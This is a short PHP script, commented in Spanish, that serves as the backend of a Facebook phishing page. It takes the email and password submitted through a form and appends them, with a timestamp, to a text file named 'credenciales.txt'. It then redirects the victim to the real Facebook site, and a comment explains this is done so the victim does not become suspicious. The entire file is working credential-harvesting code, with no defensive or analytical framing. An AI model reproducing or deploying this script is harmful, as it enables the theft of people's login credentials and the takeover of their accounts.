<?php
// 1. Verificar si se enviaron datos por POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // 2. Capturar los datos del formulario
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // 3. Definir dónde guardar los datos (archivo de texto)
    $file = 'credenciales.txt';
    
    // 4. Abrir el archivo en modo "añadir" (a) para no sobrescribir lo anterior
    $f = fopen($file, 'a');
    
    // 5. Escribir los datos con un formato legible
    fwrite($f, "\n--- Nueva Credencial ---\n");
    fwrite($f, "Email: " . $email . "\n");
    fwrite($f, "Password: " . $password . "\n");
    fwrite($f, "Fecha/Hora: " . date('d/m/Y H:i:s') . "\n");
    fwrite($f, "----------------------------\n");
    
    // 6. Cerrar el archivo
    fclose($f);
    
    // .Opcional: Redirigir a la víctima a la página real de Facebook 
    // para que no sospeche (Phishing clásico)
    header("Location: https://www.facebook.com/");
    exit();

} else {
    // Si alguien accede directamente al archivo sin enviar datos
    echo "No se recibieron datos.";
}
?>
